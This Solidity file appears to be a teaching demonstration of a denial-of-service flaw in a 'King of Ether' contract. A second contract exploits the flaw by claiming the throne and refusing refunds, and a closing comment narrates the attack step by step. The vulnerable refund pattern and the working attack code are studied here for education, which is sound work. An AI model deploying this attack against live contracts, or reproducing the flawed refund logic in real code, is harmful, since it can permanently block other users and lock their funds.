// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingOfEther{

    address public king; //address of the king sending the highest amount of Ether 
    uint public balance; //track the balance of the highest amount 

    function claimThrone() external payable{ //external so that other contracts can call it 
 //to be crowned king, the amount the participant pays have to be higher than the balance
    require(msg.value > balance, "You need to pay more to become the king"); 

//refund the former king with the amount he sent previously via the call method to send Ether back
    (bool sent, ) = king.call{value: balance}(""); 
    require(sent, "Failed to send Ether"); //confirm if it was sent, if it fails then revert and display the error 
    
    balance = msg.value; //update of the new highest amount that enables to claim the throne 
    king = msg.sender; //update the new king that has more Ether which is msg.sender 
    }
}


contract Attack {

    //state variable that replicates the main contract
    //enables the contract attack to interact with the contract KingOfEther
    KingOfEther kingofether; 

    constructor(KingOfEther _kingofether){ //constructor that takes in the address of contract to be attacked 
    //( gets the deployed address of the main contract to penetrate it )

    //initialise the address of the main contract in order for the attacker to access its functions
        kingofether = KingOfEther(_kingofether); 

    }

//function attack that enables the attacker to send Ether by calling the claimThrone function of the main contract 
    function attack() public payable{ 
        kingofether.claimThrone{value: msg.value}();

    }
}
//How did the attack happened? 
/* - Victoria sends 1 Ether and becomes king 
   - Kemi sends 3 Ether to claim the throne and takes over the role of king, Victoria is refunded back
   - Ndiana sends 5 Ether and therefore becomes the new king, Kemu is refunded back the 3 Ether she sent
   - The attacker claims the throne by calling the attack function and sends 6 Ether. 
The attacker is the new king and Ndiana receives her 5 Ether refund. 
From now on, if Mercia or any other person wants to be king and call claimThrone() function,
the refund to the attacker will revert because the attacker contract has not added the receive() or fallback() function to 
receive Ether, so that no other person will be able to send Ether after him, 
the attacker becomes and stays king no matter what. 
*/ 